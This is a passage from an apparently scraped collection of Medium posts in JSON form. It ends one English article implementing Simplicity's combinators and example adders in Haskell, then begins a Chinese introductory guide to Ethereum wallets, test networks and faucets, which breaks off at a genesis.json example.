Haskell\u2019s automatic currying, you can also think of comp as a function that takes two expressions s and t, and returns a new expression (i.e., a new Haskell function from one value to another).                                    [         expression          ]combinator   expression  expression     input value   output value             (* -> *)    (* -> *)    -> *          -> * comp ::      (a -> b) -> (b -> c)    -> a          -> ccomp         s           t              a          -> t (s a)This is a useful perspective, and arguably the \u201ccorrect\u201d one, not only because of the different nature of the arguments but also because of the difference in when these arguments are passed. The expressions s and t are provided at the time the Simplicity program is written (i.e., by the programmer or compiler), and the value a is provided at runtime, when the program is run.injl :: (a -> b) -> a -> Either b cinjl t a = Left (t a)injr :: (a -> c) -> a -> Either b cinjr t a = Right (t a)The injl and injr combinators each take one expression, t. When applied to a value, they first apply the expression t, and then inject the result into a sum type by adding a Left or Right tag, respectively.match :: ((a, c) -> d) -> ((b, c) -> d) -> (Either a b, c) -> dmatch s t (Left a, c) = s (a, c)match s t (Right b, c) = t (b, c)The match combinator (renamed from Simplicity\u2019s case because case is a reserved word in Haskell) takes two expressions, s and t. When applied to a value, which must be a product (ab, c), it pattern-matches on ab, and applies either s or t to the contained value (along with the extra state c) based on whether the tag is a `Left` or `Right`, respectively.pair :: (a -> b) -> (a -> c) -> a -> (b, c)pair s t a = (s a, t a)The pair combinator takes two expressions, s and t. When applied to a value, it creates a pair whose first value is the result of applying s to a, and whose second value is the result of applying t to a.take :: (a -> c) -> (a, b) -> ctake f (a, _) = f adrop :: (b -> c) -> (a, b) -> cdrop f (_, b) = f bThe take and drop combinators each take one expression, f. When applied to a value\u200a\u2014\u200awhich must be a product (a, b)\u200a\u2014\u200athey apply the expression f to the first or second value, respectively, and throw the other value away.Example Simplicity programsNow we can use these combinators to define expressions that represent arbitrary functions from inputs to outputs.The following examples are taken almost verbatim from the Simplicity paper (just translating the type names and type annotation syntax, and changing case to match).not :: Bit -> Bitnot = comp (pair iden unit) (match (injr unit) (injl unit))This function takes one bit (zero or one, i.e., Left () or Right ()) and converts it into the opposite bit.How does this work? Suppose we apply this expression to the value Left (). We can use equational reasoning to gradually simplify this expression, one combinator at a time:comp (pair iden unit) (match (injr unit) (injl unit)) (Left ())-- comp s t a = t (s a)match (injr unit) (injl unit) ((pair iden unit) (Left ()))-- pair s t a = (s a, t a)match (injr unit) (injl unit) (iden (Left ()), unit (Left ()))-- iden a = amatch (injr unit) (injl unit) (Left (), unit (Left ()))-- match s t (Left a, c) = s (a, c)injr unit ((), unit (Left ()))-- injr s a = Right (s a)Right (unit ((), unit (Left ())))-- unit _ = ()Right ()To try this out, you can use the online REPL at https://repl.it/@danrobinson/core-simplicity, or download the code from there and try it yourself in ghci:> not zero=> Right ()> not zero == one=> True> not one == zero=> TrueThis next function takes two one-bit numbers, adds them, and returns an overflow bit and a result:halfAdder :: (Bit, Bit) -> (Bit, Bit)halfAdder = match (drop (pair (injl unit) iden)) (drop (pair iden not))You can use this half-adder to build a full-adder, which takes two one-bit numbers and an overflow bit and returns a new overflow bit as a result:fullAdder1 :: ((Bit, Bit), Bit) -> (Bit, Bit)fullAdder1 = comp (pair (take halfAdder) (drop iden))            (comp (pair (take (take iden))            (comp (pair (take (drop iden)) (drop iden))              halfAdder))            (pair (match (drop (take iden)) (injr unit))              (drop (drop iden))))You can try it out too:> fullAdder1 ((one, one), zero)=> (Right (),Left ())> fullAdder1 ((zero, zero), one)=> (Left (),Right ())These last two functions implement adders for 2-bit words and 4-bit words. (The Simplicity paper defines these recursively, but doing so in Haskell would require some type-level magic that\u2019s beyond the scope of this post.)fullAdder2 :: ((Word2, Word2), Bit) -> (Bit, Word2)fullAdder2 = comp (pair (take (pair (take (take iden))                                   (drop (take iden))))            (comp (pair (take (pair (take (drop iden))                                    (drop (drop iden))))                        (drop iden))                   fullAdder1))            (comp (pair (drop (drop iden))                  (comp (pair (take iden)                              (drop (take iden)))                        fullAdder1))            (pair (drop (take iden))                  (pair (drop (drop iden)) (take iden))))fullAdder4 :: ((Word4, Word4), Bit) -> (Bit, Word4)fullAdder4 = comp (pair (take (pair (take (take iden))                                    (drop (take iden))))            (comp (pair (take (pair (take (drop iden))                                    (drop (drop iden))))                        (drop iden))                    fullAdder2))            (comp (pair (drop (drop iden))                  (comp (pair (take iden)                              (drop (take iden)))                        fullAdder2))            (pair (drop (take iden))                  (pair (drop (drop iden)) (take iden))))ConclusionHopefully this post has made it easier to understand and try out core Simplicity. I also hope it demonstrated some of the power and flexibility that Haskell provides when working with domain-specific languages.Thanks to Russell O\u2019Connor, Boyma Fahnbulleh, Bob Glickstein, and Keith Rarick for reviewing a draft of this post.", "responses": "1"}, {"title": "Ethereum Smart Contract\u00a0\u5165\u9580\u96dc\u8ac7", "author_name": "Yuren Ju", "link": "https://medium.com/taipei-ethereum-meetup/ethereum-smart-contract-%E5%85%A5%E9%96%80%E9%9B%9C%E8%AB%87-59a6398f03c?source=search_post", "post_date": "Aug 9, 2017", "readtime": "14 min read", "upvotes": "275", "content": "Ethereum Smart Contract\u00a0\u5165\u9580\u96dc\u8ac7Yuren JuBlockedUnblockFollowFollowingAug 9, 2017\u6700\u8fd1\u60f3\u958b\u59cb\u8a66\u8a66 Ethereum \u7684 Smart Contract\uff0c\u5165\u9580\u6642\u537b\u9047\u5230\u5f88\u591a\u554f\u984c\uff0c\u611f\u8b1d Taipei Ethereum Meetup \u8207 Chih-Cheng Liang \u7684\u5354\u52a9\uff0c\u6700\u8fd1\u7d42\u65bc\u6bd4\u8f03\u641e\u6e05\u695a\u4e00\u4e9b\u57fa\u790e\u77e5\u8b58\uff0c\u5beb\u4e0b\u4f86\u5206\u4eab\u7d66\u5176\u4ed6\u4e5f\u60f3\u5b78\u7fd2 Smart Contract \u7684\u65b0\u624b\u3002\u4ee5\u4e0b\u7684\u4ecb\u7d39\u5c31\u53ea\u5305\u542b\u57fa\u790e\u77e5\u8b58\u5230\u6db5\u84cb\u5230\u8981\u5982\u4f55\u958b\u59cb\u7167\u8457\u5b98\u65b9\u7684 Create your own crypto-currency \u6307\u5f15\u958b\u59cb\u5beb Smart Contract\uff0c\u5269\u4e0b\u7684\u53ef\u80fd\u4e4b\u5f8c\u6703\u518d\u767c\u5176\u4ed6\u6587\u7ae0\u4ecb\u7d39\u3002\u4e00\u4e9b\u4e2d\u82f1\u5c0d\u7167\uff1aEthereum: \u4ee5\u592a\u574aEther: \u4ee5\u592a\u5e63Smart Contract: \u667a\u6167\u5408\u7d04 / \u667a\u80fd\u5408\u7d04Wallet: \u9322\u5305Faucet: \u767c\u6e2c\u8a66\u7528\u4ee5\u592a\u5e63\u7684\u670d\u52d9Smart Contract\u00a0\u7c21\u4ecbSmart Contract \u662f\u5728\u5340\u584a\u93c8\u4e0a\u7684\u5408\u7d04\uff0c\u5408\u7d04\u8ddf\u57f7\u884c\u7684\u7d50\u679c\u90fd\u6703\u5132\u5b58\u5728\u5340\u584a\u93c8\u4e0a\u9762\u3002\u6bd4\u5982\u8aaa\u4f60\u8981\u767c\u884c\u8ca8\u5e63\uff0c\u4e26\u4e14\u63d0\u4f9b\u8f49\u5e33 (transfer) \u4ee5\u53ca\u8cb7\u8ce3\u529f\u80fd\u5c31\u662f\u4e00\u500b\u5408\u7d04\uff0c\u6bd4\u5982\u8aaa\u5728\u5340\u584a\u93c8\u4e0a\u4e00\u9593\u516c\u53f8\u7684\u80a1\u6771\u767c\u8d77\u6295\u7968\u4e5f\u662f\u4e00\u7a2e Smart Contract\u3002\u5982\u679c\u4f60\u662f\u8edf\u9ad4\u5de5\u7a0b\u5e2b\u61c9\u8a72\u6703\u60f3\uff1a\u9019\u6211\u4e5f\u53ef\u4ee5\u81ea\u5df1\u958b\u767c\u51fa\u985e\u4f3c\u7684\u7cfb\u7d71\u554a\uff1f\u6c92\u932f\uff0c\u5340\u584a\u93c8\u4e0a\u7684\u61c9\u7528\u57fa\u672c\u4e0a\u4f60\u90fd\u53ef\u4ee5\u5728\u6c92\u6709\u4f7f\u7528\u5340\u584a\u93c8\u7684\u60c5\u6cc1\uff0c\u7528\u4f60\u6163\u7528\u7684\u65b9\u5f0f\u5be6\u4f5c\uff0c\u4e0a\u9762\u8209\u7684\u9019\u5169\u500b\u4f8b\u5b50\uff0c\u4f60\u90fd\u53ef\u4ee5\u81ea\u5df1\u5beb\u7cfb\u7d71\u4f86\u505a\uff0c\u53ea\u662f\u9019\u4e9b\u505a\u51fa\u4f86\u7684\u7cfb\u7d71\u901a\u5e38\u662f\u96c6\u4e2d\u5f0f (centralized) \u7684\u67b6\u69cb\u3002Ethereum \u7684 Smart Contract \u4e0d\u4e00\u6a23\u7684\u5730\u65b9\u662f\uff1aEthereum \u672c\u8eab\u5c31\u662f\u4e00\u500b\u865b\u64ec\u8ca8\u5e63\u91d1\u6d41\u7cfb\u7d71\uff0c\u6240\u4ee5\u8655\u7406\u8ddf\u865b\u64ec\u8ca8\u5e63\u91d1\u6d41\u76f8\u95dc\u7684\u4e8b\u60c5\u6703\u975e\u5e38\u5bb9\u6613\u3002\u5b83\u662f\u5206\u6563\u5f0f\u7cfb\u7d71\uff0c\u8a08\u7b97\u7d50\u679c\u8207\u5beb\u5165\u7684\u8cc7\u8a0a\u6703\u5b58\u5728\u5206\u6563\u5f0f\u7684\u5e33\u672c\u88e1\u9762\u7d93\u904e\u8a31\u591a\u4eba\u9a57\u8b49\u3002\u5982\u679c\u6709\u4eba\u60f3\u8981\u7ac4\u6539\u5c31\u6703\u8b8a\u6210\u8981\u653b\u64ca\u6574\u500b\u7cfb\u7d71\u5167\u7684\u975e\u5e38\u591a\u7bc0\u9ede\u624d\u6709\u8fa6\u6cd5\u8fa6\u5230\u3002\u4f60\u53ef\u4ee5\u60f3\u50cf\u63d0\u4f9b\u8f49\u5e33\u6216\u662f\u80a1\u6771\u6295\u7968\u662f\u4f60\u81ea\u5df1\u5beb\u7684\u7cfb\u7d71\u6642\uff0c\u4e00\u65e6\u88ab\u5165\u4fb5\u4e3b\u6a5f\u7ac4\u6539\u5f8c\u7684\u7d50\u679c\u3002\u4f46\u662f\u5728 Smart Contract \u4e0b\u7576\u8cc7\u8a0a\u5df2\u7d93\u88ab\u5beb\u5165\u5340\u584a\u93c8\u5f8c\uff0c\u8981\u88ab\u4fee\u6539\u5c31\u6703\u8b8a\u5f97\u56f0\u96e3\u8a31\u591a\uff08\u4f46\u4e0d\u898b\u5f97\u4e0d\u6703\u88ab\u5165\u4fb5\uff0c\u5b89\u5168\u6027\u5176\u5be6\u4e5f\u662f\u500b\u6311\u6230\uff09\u3002\u5982\u679c\u4f60\u9700\u8981\u4ec0\u9ebc\u61c9\u7528\u662f\u5e0c\u671b\u5beb\u5165\u5f8c\u7684\u7d50\u679c\u662f\u900f\u660e\u3001\u4e0d\u5bb9\u6613\u88ab\u7ac4\u6539\u4e26\u4e14\u662f\u5206\u6563\u5f0f\u67b6\u69cb\uff0c\u4f60\u53ef\u4ee5\u8003\u616e\u5c07\u9019\u500b\u61c9\u7528\u653e\u5230\u5340\u584a\u93c8\u4e0a\u3002Wallet, Backend &\u00a0Network\u9019\u662f\u6211\u525b\u958b\u59cb\u89ba\u5f97\u6700\u6df7\u4e82\u7684\u90e8\u5206\uff0c\u525b\u958b\u59cb\u5165\u9580 Ethereum \u8207\u5176\u4ed6\u5340\u584a\u93c8\u4e00\u6a23\u90fd\u6703\u9700\u8981\u6709\u9322\u5305 (Wallet)\u3002\u800c\u9322\u5305\u5927\u81f4\u4e0a\u53ef\u4ee5\u5206\u6210\u6709\u5716\u5f62\u5316\u4f7f\u7528\u4ecb\u9762 (GUI) \u6216\u662f\u53ea\u6709\u6307\u4ee4\u4ecb\u9762\u3002\u525b\u958b\u59cb\u6703\u5148\u4f7f\u7528\u6709 GUI \u4ecb\u9762\u7684\uff0c\u4f46\u662f\u771f\u7684\u8981\u958b\u767c\u6642\u9084\u662f\u6703\u9700\u8981\u6307\u4ee4\u4ecb\u9762\u7684\u7a0b\u5f0f\u6703\u66f4\u5be6\u7528\u3002Wallet Backend \u662f\u8ca0\u8cac\u771f\u6b63\u5c0d\u5340\u584a\u93c8\u7684\u64cd\u4f5c\uff0c\u76ee\u524d\u6211\u6709\u7528\u904e\u7684 backend \u6709 geth \u8ddf parity\u3002\u81f3\u65bc\u9019\u4e9b Wallet Backend \u5247\u53ef\u4ee5\u7528\u8a2d\u5b9a\u7684\u65b9\u5f0f\u9023\u63a5\u5230\u8a31\u591a\u4e0d\u540c\u7684 Network (\u7db2\u8def)\uff0c\u6709\u516c\u7528\u7db2\u8def\u4e5f\u6709\u79c1\u6709\u7db2\u8def\uff0c\u751a\u81f3\u6709\u6e2c\u8a66\u7528\u7684\u6a21\u64ec\u7db2\u8def\u7b49\u3002Wallet UIMist: \u5c31\u662f\u90a3\u5957\u53ef\u4ee5\u5728 ethereum.org \u5b98\u7db2\u4e0b\u8f09\u7684\u9322\u5305\u8edf\u9ad4\uff0c\u5176\u4e2d\u88e1\u9762\u5167\u5efa\u4e86 geth \u6838\u5fc3\uff0c\u6240\u4ee5 Wallet backend \u662f\u4f7f\u7528 geth\uff0cMist \u4e3b\u8981\u5c31\u662f GUI \u4ecb\u9762\u3002\u82e5\u6c92\u6709\u66f4\u6539\u904e geth \u7684\u8a2d\u5b9a\uff0c\u4f7f\u7528 Mist \u7b2c\u4e00\u6b21\u540c\u6b65\u8981\u82b1\u975e\u5e38\u4e45\u7684\u6642\u9593\u3002\u4f7f\u7528\u6e2c\u8a66\u7db2\u8def\u7684 MistParity: \u9019\u662f\u53e6\u5916\u4e00\u5957 Wallet\uff0c\u7279\u9ede\u662f\u540c\u6b65\u5340\u584a\u7684\u901f\u5ea6\u6bd4\u8d77 Mist/geth \u8981\u66f4\u5feb\u3002\u5176\u4ecb\u9762\u662f web\u3002\u4f7f\u7528 parity ui \u6307\u4ee4\u5c31\u6703\u76f4\u63a5\u5728\u4f60\u7684\u9810\u8a2d\u700f\u89bd\u5668\u4e0a\u958b\u555f Parity Web UI\u3002\u5b83\u7684 backend \u8ddf frontend \u653e\u5728\u4e00\u8d77\uff0c\u4e26\u6c92\u6709\u7279\u610f\u5206\u6210\u5169\u500b\u5c08\u6848\uff0c\u6240\u4ee5\u5728\u67b6\u69cb\u5716 backend \u90a3\u6b04\u4e5f\u662f parity\u3002geth console: \u9019\u662f\u5305\u542b\u5728 geth (ethereum-go) \u7684\u4e00\u500b\u6307\u4ee4\u4ecb\u9762\uff0c\u8ddf JavaScript \u7684 console \u975e\u5e38\u985e\u4f3c\uff0c\u53ef\u4ee5\u7528\u6307\u4ee4\u7684\u65b9\u5f0f\u57f7\u884c\u5404\u7a2e\u529f\u80fd\u5982\u67e5\u770b\u9918\u984d\u3001\u532f\u6b3e\u3001\u8b80\u53d6 script \u7b49\u7b49\u529f\u80fd\u3002\u6bd4\u5982\u8aaa\u8981\u532f\u6b3e\u5c31\u53ef\u4ee5\u7528\u4ee5\u4e0b\u6307\u4ee4\uff1aeth.sendTransaction({from: eth.accounts[0], to: eth.accounts[1], value: 1000})Wallet BackendParity: \u525b\u6709\u4ecb\u7d39\u904e\u4e86 Parity \u672c\u8eab\u5305\u542b\u4e86 Web UI \u8207 ethereum client\u3002\u4e0d\u904e\u56e0\u70ba Parity \u4e5f\u63d0\u4f9b\u4e86\u8207 geth \u76f8\u5bb9\u7684\u4ecb\u9762\uff0c\u6240\u4ee5\u5982\u679c\u4f60\u60f3\u8981\u7528 Parity \u4f5c\u70ba backend\uff0cMist \u4f5c\u70ba frontend \u4e5f\u662f\u53ef\u4ee5\uff0c\u8a73\u60c5\u53ef\u4ee5\u770b\u9019\u500b reddit\u3002geth (ethereum-go): \u9664\u4e86 console UI \u4ee5\u5916\uff0cgeth \u9084\u662f\u4e00\u500b\u5b8c\u6574\u7684 ethereum client\uff0c\u9019\u4e5f\u662f\u70ba\u4ec0\u9ebc mist \u88e1\u9762\u6703\u5305\u542b\u4e00\u500b geth\uff0c\u56e0\u70ba mist \u672c\u8eab\u53ea\u6709 GUI \u4ecb\u9762\uff0c\u771f\u6b63\u5c0d\u4e59\u592a\u574a\u7684\u64cd\u4f5c\u90fd\u662f\u7531 geth \u63d0\u4f9b\u3002\u6240\u4ee5\u7531 geth \u672c\u8eab\u63d0\u4f9b\u5168\u529f\u80fd\u7684 ethereum client\uff0c\u642d\u914d\u4e0a geth console \u7684\u6307\u4ee4\u4ecb\u9762\uff0c\u5beb\u5408\u7d04\u7a0b\u5f0f\u6642\u5c31\u53ef\u4ee5\u4f7f\u7528\u9019\u500b\u5de5\u5177\u505a\u4e00\u4e9b\u958b\u767c\u8005\u7fd2\u6163\u7684\u64cd\u4f5c\u3002Network\u6211\u525b\u958b\u59cb\u5728\u9019\u908a\u88ab\u56f0\u4e86\u5f88\u4e45\uff0c\u56e0\u70ba\u5b98\u7db2\u4e0a\u9762\u7684 token tutorial \u5beb\u5f97\u4e26\u4e0d\u662f\u5f88\u6e05\u695a\u3002Ethereum \u6709\u5f88\u591a\u4e0d\u540c\u7684\u7db2\u8def\u53ef\u4ee5\u9078\u64c7\uff0c\u771f\u6b63\u7684\u4ee5\u592a\u5e63 (ether) \u662f\u653e\u5728 mainnet \u4e0a\u9762\uff0c\u4f46\u662f\u5728\u958b\u59cb\u628a smart contract \u767c\u4f48\u5230 mainnet \u4e4b\u524d\uff0c\u4f60\u53ef\u4ee5\u6709\u5f88\u591a\u7a2e\u65b9\u5f0f\u6e2c\u8a66\u3002\u516c\u958b\u7684\u6e2c\u8a66\u7db2\u8def\uff1a\u7db2\u8def\u4e0a\u6709\u4e00\u4e9b\u516c\u958b\u7684\u6e2c\u8a66\u7db2\u8def\u5982 Rposten \u6216 Kovan\uff0c\u9019\u4e9b\u662f\u516c\u958b\u5728\u7db2\u8def\u4e0a\u7684\u670d\u52d9\uff0c\u4e5f\u53ef\u4ee5\u7528 etherscan.io \u67e5\u8a62\u5230\u76f8\u95dc\u7684\u4ea4\u6613\u8207\u5408\u7d04\u3002\u79c1\u6709\u93c8 (private chain)\uff1a\u8ddf\u4e0a\u9762\u7684\u7db2\u8def\u4e00\u6a23\uff0c\u53ea\u662f\u662f\u53ef\u4ee5\u7531\u4f60\u81ea\u5df1\u5275\u9020\uff0c\u7531\u65bc\u662f\u81ea\u5df1\u5275\u9020\u7684\u95dc\u4fc2\u53ef\u4ee5 mining \u7684\u901f\u5ea6\u8abf\u5feb\u4e00\u4e9b\uff0c\u8b93\u4f60\u5f88\u5feb\u5c31\u53ef\u4ee5\u6709\u6e2c\u8a66\u7528\u7684\u4ee5\u592a\u5e63\u53ef\u4ee5\u7528\u3002testprc\uff1a\u9019\u662f\u4e00\u500b node.js \u6a21\u7d44\uff0c\u4ed6\u6703\u63d0\u4f9b\u4e00\u500b\u6a21\u64ec\u7db2\u8def\u63d0\u4f9b\u4f60\u6e2c\u8a66\u7528\u3002\u4e0a\u9762\u4e5f\u653e\u4e86\u8a31\u591a\u4ee5\u592a\u5e63\u8207\u8ddf\u5176\u4ed6 ethereum \u76f8\u5bb9\u7684\u4ecb\u9762\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528 geth attach <TESTRPC_ADDRESS> \u76f4\u63a5\u9023\u4e0a\u4f86\u6e2c\u8a66\u3002\u6587\u672b\u518d\u4f86\u89e3\u91cb\u4e00\u4e0b\u8981\u600e\u9ebc\u9023\u5230\u9019\u4e9b\u7db2\u8def\u3002\u4e0b\u9762\u5148\u5217\u51fa\u5e7e\u500b\u6211\u9047\u5230\u7684\u7591\u554f\u8ddf\u53ef\u80fd\u7684\u89e3\u7b54\u3002\u540c\u6b65\u5e33\u672c\u9700\u8981\u82b1\u8cbb\u975e\u5e38\u4e45\u7684\u6642\u9593\u9019\u662f\u6211\u525b\u958b\u59cb\u9047\u5230\u7684\u7b2c\u4e00\u500b\u554f\u984c\uff0c\u5982\u679c\u4f60\u4f7f\u7528 Mist Wallet \u4e5f\u5c31\u662f\u5b98\u65b9\u7db2\u7ad9\u4e0a\u53ef\u4ee5\u4e0b\u8f09\u7684\u90a3\u500b\u9322\u5305\uff0c\u6211\u82b1\u4e86\u9694\u591c\u7684\u6642\u9593\u5728 Mist \u4e0a\u628a\u6240\u6709\u7684\u5340\u584a\u540c\u6b65\u5b8c\u3002\u5982\u679c\u4f60\u9700\u8981\u5feb\u4e00\u9ede\u7684\u9078\u64c7\uff0c\u53ef\u4ee5\u7528 Parity Wallet\uff0c\u4f46\u6211\u81ea\u5df1\u662f\u60f3\u7167\u8457\u5b98\u65b9\u6307\u5f15\u5148\u505a\u4e00\u6b21\uff0c\u6240\u4ee5\u6211\u9084\u662f\u9078\u64c7\u7528 Mist \uff08\u4f46\u662f\u6211\u73fe\u5728\u77e5\u9053\u5176\u5be6\u6211\u53ef\u4ee5\u7528 parity \u4f5c\u70ba backend \u642d\u914d Mist \u7684\u4ecb\u9762\u4e86\uff0c\u70ba\u6642\u5df2\u665a\uff5e\uff5e\uff09\u3002\u767c\u4f48 Smart Contract\u00a0\u9700\u8981\u4ee5\u592a\u5e63\u4e0d\u8ad6\u662f mainnet \u6216 testnet \u90fd\u9700\u8981\u4ee5\u592a\u5e63\u628a\u5408\u7d04\u90e8\u7f72\u5230\u5340\u584a\u93c8\u4e0a\uff0c\u6240\u4ee5\u4f60\u6703\u9700\u8981\u4e00\u9ede\u4ee5\u592a\u5e63\uff0c\u986f\u7136\u6e2c\u8a66\u6642\u7528\u4e3b\u7db2\u8def\u5f88\u4e0d\u7406\u667a\u3002\u96d6\u7136\u6e2c\u8a66\u7db2\u8def\u4e5f\u9700\u8981\u4ee5\u592a\u5e63\uff0c\u53ea\u662f\u9019\u500b\u6e2c\u8a66\u7528\u7684\u4ee5\u592a\u5e63\u53ea\u5b58\u5728\u6e2c\u8a66\u7db2\u8def\u4e0d\u6703\u5728\u5916\u9762\u6d41\u901a\uff0c\u4e5f\u53ef\u4ee5\u900f\u904e\u4e00\u4e9b\u7ba1\u9053\u53d6\u5f97\u6e2c\u8a66\u7528\u7684\u4ee5\u592a\u5e63\u3002\u90a3\u600e\u9ebc\u53d6\u5f97\u9019\u4e9b\u6e2c\u8a66\u7528\u4ee5\u592a\u5e63\u5462\uff1f\u7db2\u8def\u4e0a\u6703\u6709\u4eba\u5efa\u7acb\u4e00\u4e9b faucet service \u8b93\u4f60\u53ef\u4ee5\u8f15\u6613\u5730\u53d6\u5f97\u6e2c\u8a66\u7528\u7684\u4ee5\u592a\u5e63\uff0c\u53ef\u4ee5\u5f9e\u90a3\u908a\u53d6\u5f97\uff0c\u4f46\u9019\u5c31\u5ef6\u4f38\u51fa\u7b2c\u4e8c\u7684\u554f\u984c\u3002\u6e2c\u8a66\u7db2\u8def\u4e0d\u53ea\u4e00\u500b\u60f3\u8981\u53d6\u5f97\u6e2c\u8a66\u7db2\u8def\u7684\u4e59\u592a\u5e63\u5728 Taipei Ethereum Meetup \u7684 slack \u4e0a\u9762\u8a62\u554f\u5f8c\u624d\u77e5\u9053\uff0c\u539f\u4f86\u6e2c\u8a66\u7db2\u8def\u4e0d\u53ea\u4e00\u7a2e\u3002\u6211\u76ee\u524d\u7528\u7684\u6709 Kovan \u8ddf Ropsten\uff0c\u800c Mist wallet \u9810\u8a2d\u662f Rposten\uff0c\u800c\u4f7f\u7528 Parity \u53ef\u4ee5\u9078\u64c7\u8a31\u591a\u4e0d\u540c\u7684\u6e2c\u8a66\u7db2\u8def\u30022017/8/10 \u66f4\u65b0\uff1amist \u5728 0.9 \u7248\u672c\u4ee5\u5f8c\u652f\u63f4\u5207\u63db\u5230 rinkeby \u7db2\u8def\uff0c\u64b0\u5beb\u6587\u7ae0\u6642\u6211\u7528\u7684\u662f 0.8.10\u3002\u4e0d\u540c\u7684\u6e2c\u8a66\u7db2\u8def\u6703\u6709\u4e0d\u540c\u7684 faucet service \u53ef\u7528\u3002\u4f8b\u5982\u6211\u73fe\u5728\u4f7f\u7528\u7684 Rposten \u7db2\u8def\u53ef\u4ee5\u7528\u4ee5\u4e0b\u6307\u4ee4\u53d6\u5f97\u6e2c\u8a66\u7528\u7684\u4ee5\u592a\u5e63\u5982\u4e0b\uff1acurl -X POST  -H \"Content-Type: application/json\" -d '{\"toWhom\":\"YOUR_ADDRESS\"}' https://ropsten.faucet.b9lab.com/tap\u5982\u679c\u5728\u4e0d\u540c\u7684\u6e2c\u8a66\u7db2\u8def\uff0c\u53ef\u4ee5\u5728\u7db2\u8def\u4e0a\u627e\u90a3\u500b\u6e2c\u8a66\u7db2\u8def\u7684\u540d\u7a31\u52a0\u4e0a faucet\uff0c\u6bd4\u5982\u8aaa kovan faucet \u3002\u53d6\u5f97\u6e2c\u8a66\u7db2\u8def\u7684\u4ee5\u592a\u5e63\u5f8c\uff0c\u4f60\u5c31\u53ef\u4ee5\u7167\u8457\u5b98\u65b9\u7684\u6307\u5f15\u958b\u59cb\u5beb Smart Contract\u3002\u9023\u63a5\u516c\u958b\u7db2\u8def\u6211\u5011\u8981\u5148\u8b1b\u7684\u662f\u516c\u958b\u7684\u5340\u584a\u93c8\u7db2\u8def\u8981\u5982\u4f55\u9023\u63a5\uff0c\u9019\u908a\u6703\u8b1b\u7528 Mist, geth \u4ee5\u53ca parity \u5206\u5225\u8981\u600e\u9ebc\u5207\u63db\u7db2\u8def\u3002Mist\u5728 Mist 0.8.10 \u7684\u4ecb\u9762\u88e1\u9762\uff0c\u4f60\u53ef\u4ee5\u9078\u64c7 mainnet \u6216 testnet\uff0cmainnet \u5c31\u662f\u4e3b\u7db2\u8def\uff0c\u6703\u4f7f\u7528\u771f\u7684\u4ee5\u592a\u5e63\u7684\u5730\u65b9\u3002testnet \u5728 Mist 0.8.10 \u5167\u5247\u662f\u6307 Rposten \u6e2c\u8a66\u7db2\u8def\uff0c\u5728 0.9 \u7248\u958b\u59cb\u65b0\u589e\u4e86 Rinkeby \u6e2c\u8a66\u7db2\u8def\uff0c\u6240\u4ee5\u5c31\u6709\u5169\u500b\u6e2c\u8a66\u7db2\u8def\u53ef\u4ee5\u9078\u3002\u6211\u5728\u770b\u7db2\u8def\u4e0a\u7684\u6587\u7ae0\u6642\u6709\u63d0\u5230 Mist \u6703\u5075\u6e2c\u80cc\u666f\u5982\u679c\u6709\u8dd1 geth \u7684\u8a71\uff0c\u5c31\u6703\u76f4\u63a5\u9023\u63a5\u5230\u90a3\u500b\u5df2\u7d93\u958b\u8457\u7684 geth\uff0c\u4e0d\u904e\u6211\u76ee\u524d\u8a66\u904e\u5982\u679c\u5728 geth \u5207\u63db\u5230 rinkeby \u7db2\u8def\u662f\u6703\u51fa\u932f\uff0c\u9084\u4e0d\u592a\u78ba\u5b9a\u662f\u4ec0\u9ebc\u539f\u56e0\uff0c\u76ee\u524d\u731c\u6e2c\u6709\u53ef\u80fd\u662f\u56e0\u70ba\u6211\u662f\u7528 0.8.10 \u7248\u672c\u7684 mist\uff0c\u5347\u7d1a\u6709\u53ef\u80fd\u53ef\u4ee5\u89e3\u6c7a\u9019\u500b\u554f\u984c\u3002geth\u4e0b\u9054 geth --help \u5f8c\u6703\u770b\u5230\u53ef\u4ee5\u7528 --networkid, --testnet\u6216 \u2014-rinkby\u6307\u5b9a\u4e0d\u540c\u7db2\u8def\uff1a\u9664\u4e86 Frontier \u662f\u4e3b\u7db2\u8def\u5916\uff0c\u6e2c\u8a66\u7db2\u8def\u53ef\u4ee5\u9078\u64c7 (3) Rposten \u6216 (4) Rinkeby\uff0c\u81f3\u65bc\u6bcf\u500b\u7db2\u8def\u4ee3\u865f\u7684\u610f\u7fa9\u53ef\u4ee5\u53c3\u8003\u9019\u7bc7\u6587\u7ae0\uff0c\u9019\u908a\u5c31\u4e0d\u7d30\u8b1b\u4e86\u3002\u53e6\u5916\u6839\u64da StackOverFlow \u4e0a\u7684\u9019\u7bc7\u6587\u7ae0\uff0c\u7528 --testnet \u6216 --networkid \u4e0d\u4e00\u6a23\u7684\u5730\u65b9\u662f\u7528 --testnet \u9084\u6703\u984d\u5916\u7684\u5e6b\u4f60\u78ba\u8a8d\u4f60\u7684 genesis \u6a94\u6848\u662f\u6b63\u78ba\u7684\u3002Parityparity \u540c\u6a23\u7684\u7528 --help \u5c31\u53ef\u4ee5\u770b\u5230\u4f7f\u7528 --chain \u53ef\u4ee5\u6307\u5b9a\u5404\u7a2e\u6e2c\u8a66\u7db2\u8def\uff0c\u5b83\u53ef\u4ee5\u6307\u5b9a\u7684\u6e2c\u8a66\u7db2\u8def\u975e\u5e38\u591a\uff0c\u4e5f\u5305\u542b Kovan \u6e2c\u8a66\u7db2\u8def\u3002\u5efa\u7acb\u79c1\u6709\u7db2\u8def\u5efa\u7acb\u79c1\u6709\u7db2\u8def \u8ddf\u4e0b\u4e00\u7bc0 \u4f7f\u7528 testrpc \u662f\u6211\u6628\u5929 (2017/8/8) \u5728 Taipei Ethereum Meetup \u807d\u5230\u7684\uff0c\u9019\u908a\u6709\u7576\u5929\u7684\u9304\u5f71\uff0c\u611f\u8b1d\u8b1b\u8005 \u674e\u5a77\u5a77 Lee Ting Ting \u7684\u5206\u4eab\u3002\u9019\u908a\u7528 geth \u4f86\u5efa\u7acb\u79c1\u6709\u7db2\u8def\uff0c\u5efa\u7acb\u79c1\u6709\u7db2\u8def\u6642\u9700\u8981\u4e00\u500b genesis.json \u6a94\u6848\u4f86\u8a18\u9304\u9019\u500b\u79c1\u6709\u5340\u584a\u93c8\u7db2\u8def\u7684\u6240\u6709\u521d\u59cb\u689d\u4ef6\u3002\u5728\u6f14\u8b1b\u4e2d\u5979\u63d0\u4f9b\u4e86\u4e00\u500b\u6700\u5c0f\u5316\u7684 genesis.json\uff1a{  \"config\": {},  // \u6bcf\u500b block \u64cd\u4f5c\u7684 gas 